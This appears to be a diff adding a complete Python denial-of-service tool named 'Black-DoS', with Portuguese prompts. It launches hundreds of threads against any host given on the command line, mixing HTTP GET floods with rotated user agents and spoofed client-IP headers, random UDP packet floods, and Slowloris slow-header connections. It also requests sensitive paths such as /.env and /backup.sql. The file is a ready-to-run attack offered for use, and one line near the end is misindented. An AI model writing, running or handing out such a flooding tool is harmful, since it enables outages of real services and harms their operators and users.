@@ -1,0 +1,279 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+from queue import Queue
+from optparse import OptionParser
+import time, sys, socket, threading, logging, urllib.request, random, ssl
+from concurrent.futures import ThreadPoolExecutor
+
+def exibir_banner():
+    print("\033[32m")
+    print(r"""
+██████╗ ██╗      █████╗  ██████╗██╗  ██╗        ██████╗  ██████╗ ███████╗
+██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝        ██╔══██╗██╔═══██╗██╔════╝
+██████╔╝██║     ███████║██║     █████╔╝  █████╗ ██║  ██║██║   ██║███████╗
+██╔══██╗██║     ██╔══██║██║     ██╔═██╗  ╚════╝ ██║  ██║██║   ██║╚════██║
+██████╔╝███████╗██║  ██║╚██████╗██║  ██╗        ██████╔╝╚██████╔╝███████║
+╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝        ╚═════╝  ╚═════╝ ╚══════╝
+    """)
+    print("\033[0m")
+
+def user_agent():
+    global uagent
+    uagent = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
+    ]
+    return uagent
+
+attack_stats = {"packets": 0, "connections": 0, "errors": 0, "bloqueios": 0}
+host = ""
+porta = 80
+usar_ssl = False
+thr = 500
+uagent = []
+q = Queue()
+meu_ip = ""
+bloqueado = False
+
+def obter_meu_ip():
+    global meu_ip
+    try:
+        req = urllib.request.urlopen("https://api.ipify.org", timeout=5)
+        meu_ip = req.read().decode('utf-8')
+    except:
+        try:
+            req = urllib.request.urlopen("https://icanhazip.com", timeout=5)
+            meu_ip = req.read().decode('utf-8').strip()
+        except:
+            meu_ip = "127.0.0.1"
+
+def get_connection(host, port, ssl_enabled):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    if ssl_enabled:
+        contexto = ssl.create_default_context()
+        contexto.check_hostname = False
+        contexto.verify_mode = ssl.CERT_NONE
+        sock = contexto.wrap_socket(sock, server_hostname=host)
+    sock.connect((host, int(port)))
+    return sock
+
+def ataque_bloqueio():
+    global attack_stats, bloqueado
+    try:
+        paths = [
+            "/", "/index.html", "/index.php", "/wp-admin/", "/login", "/admin",
+            f"/{random.randint(1000,9999)}",
+            f"/?id={random.randint(1,99999)}",
+            "/wp-login.php", "/xmlrpc.php", "/.env", "/config.php", "/backup.sql"
+        ]
+        while True:
+            sock = None
+            try:
+                sock = get_connection(host, porta, usar_ssl)
+                path = random.choice(paths)
+                packet = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"User-Agent: {random.choice(uagent)}\r\n"
+                    f"Accept: */*\r\n"
+                    f"Accept-Encoding: gzip, deflate, br\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"Cache-Control: no-cache\r\n"
+                    f"X-Forwarded-For: {meu_ip}\r\n"
+                    f"X-Real-IP: {meu_ip}\r\n"
+                    f"X-Originating-IP: {meu_ip}\r\n"
+                    f"CF-Connecting-IP: {meu_ip}\r\n"
+                    f"True-Client-IP: {meu_ip}\r\n"
+                    f"X-Client-IP: {meu_ip}\r\n"
+                    f"X-Remote-IP: {meu_ip}\r\n"
+                    f"Client-IP: {meu_ip}\r\n"
+                    f"\r\n"
+                ).encode('utf-8')
+                sock.send(packet)
+                attack_stats["packets"] += 1
+                if not bloqueado:
+                    bloqueado = True
+                    attack_stats["bloqueios"] += 1
+                    print(f"\033[91m[!] IP {meu_ip} BLOQUEADO!\033[0m")
+                print(f"\033[92m[{time.strftime('%H:%M:%S')}] \033[94mPacote {attack_stats['packets']}\033[0m")
+                sock.close()
+                time.sleep(random.uniform(0.0001, 0.0005))
+            except:
+                attack_stats["errors"] += 1
+                if sock:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                time.sleep(random.uniform(0.001, 0.003))
+    except:
+        time.sleep(0.1)
+
+def ataque_udp():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dados = random._urandom(random.randint(1024, 2048))
+            sock.sendto(dados, (host, int(porta)))
+            attack_stats["packets"] += 1
+            print(f"\033[92m[{time.strftime('%H:%M:%S')}] \033[94mUDP {attack_stats['packets']}\033[0m")
+            sock.close()
+            time.sleep(0.0001)
+        except:
+            time.sleep(0.001)
+
+def ataque_slowloris():
+    global attack_stats
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if usar_ssl:
+            contexto = ssl.create_default_context()
+            contexto.check_hostname = False
+            contexto.verify_mode = ssl.CERT_NONE
+            sock = contexto.wrap_socket(sock, server_hostname=host)
+        sock.connect((host, int(porta)))
+        attack_stats["connections"] += 1
+        sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+        sock.send(f"X-Forwarded-For: {meu_ip}\r\n".encode())
+        for i in range(200):
+            try:
+                sock.send(f"X-Header-{i}: {random.randint(1,9999)}\r\n".encode())
+                print(f"\033[92m[{time.strftime('%H:%M:%S')}] \033[94mSlowloris {i}\033[0m")
+                time.sleep(random.uniform(0.05, 0.15))
+            except:
+                break
+        sock.close()
+    except:
+        pass
+
+def dos():
+    while True:
+        q.get()
+        tipo = random.random()
+        try:
+            if tipo < 0.75:
+                ataque_bloqueio()
+            elif tipo < 0.90:
+                ataque_udp()
+            else:
+                ataque_slowloris()
+        except:
+            pass
+        q.task_done()
+
+def usage():
+    print(''' \033[92m        Black-DoS
+    uso: python3 Black-DoS.py [-s] [-p] [-t]
+    -h, --help      : ajuda
+    -s, --server    : IP ou domínio
+    -p, --port      : porta
+    -t, --turbo     : threads \033[0m''')
+    sys.exit()
+
+def get_parameters():
+    global host, porta, thr, usar_ssl
+    optp = OptionParser(add_help_option=False, epilog="Black-DoS")
+    optp.add_option("-s","--server", dest="host", help="IP ou domínio")
+    optp.add_option("-p","--port",type="int",dest="port",help="porta")
+    optp.add_option("-t","--turbo",type="int",dest="turbo",help="threads")
+    optp.add_option("-h","--help",dest="help",action='store_true',help="ajuda")
+    opts, args = optp.parse_args()
+    if opts.help:
+        usage()
+    if opts.host is not None:
+        host = opts.host
+        if host.startswith("https://"):
+            usar_ssl = True
+            host = host.replace("https://", "").split("/")[0]
+            porta = 443 if opts.port is None else opts.port
+        elif host.startswith("http://"):
+            usar_ssl = False
+            host = host.replace("http://", "").split("/")[0]
+            porta = 80 if opts.port is None else opts.port
+        else:
+            usar_ssl = False
+            porta = 80 if opts.port is None else opts.port
+    else:
+        usage()
+    thr = 500 if opts.turbo is None else opts.turbo
+
+def obter_alvo_interativo():
+    global host, porta, thr, usar_ssl
+    alvo = input("Digite o IP ou URL: ").strip()
+    if alvo.startswith("https://"):
+        usar_ssl = True
+        host = alvo.replace("https://", "").split("/")[0]
+        porta = 443
+    elif alvo.startswith("http://"):
+        usar_ssl = False
+        host = alvo.replace("http://", "").split("/")[0]
+        porta = 80
+    else:
+        usar_ssl = False
+        host = alvo.split("/")[0]
+        p = input("Porta (padrão 80): ").strip()
+        porta = 80 if p == "" else int(p)
+    t = input("Threads (padrão 500): ").strip()
+    thr = 500 if t == "" else int(t)
+
+def stats_monitor():
+    while True:
+        time.sleep(10)
+        pps = attack_stats["packets"] / 10
+        status = "BLOQUEADO" if bloqueado else "ATACANDO"
+        print(f"\033[94m[Stats] {pps:.0f} p/s | {status} | Erros: {attack_stats['errors']}\033[0m")
+
+if __name__ == '__main__':
+    exibir_banner()
+    if len(sys.argv) < 2:
+        obter_alvo_interativo()
+    else:
+        get_parameters()
+    obter_meu_ip()
+    print(f"\033[92mIP: {meu_ip} -> {host}:{porta} | SSL: {usar_ssl} | {thr} threads\033[0m")
+    print("\033[94mIniciando...\033[0m")
+    user_agent()
+    time.sleep(1)
+    try:
+        sock = get_connection(host, porta, usar_ssl)
+        sock.close()
+        print("\033[92mConectado!\033[0m\n")
+    except:
+        print("\033[91mErro de conexão\033[0m\n")
+    threading.Thread(target=stats_monitor, daemon=True).start()
+    try:
+        with ThreadPoolExecutor(max_workers=int(thr)) as executor:
+            for i in range(int(thr)):
+                executor.submit(dos)
+            item = 0
+            while True:
+                if item > 5000:
+                    item = 0
+                    time.sleep(0.05)
+                item += 1
+                q.put(item)
+                time.sleep(0.0001)
+    except KeyboardInterrupt:
+        print(f"\n\033[91mParado. Pacotes: {attack_stats['packets']}\033[0m")
+        if bloqueado:
+            print(f"\033[92mIP {meu_ip} liberado!\033[0m")
+         sys.exit(0)
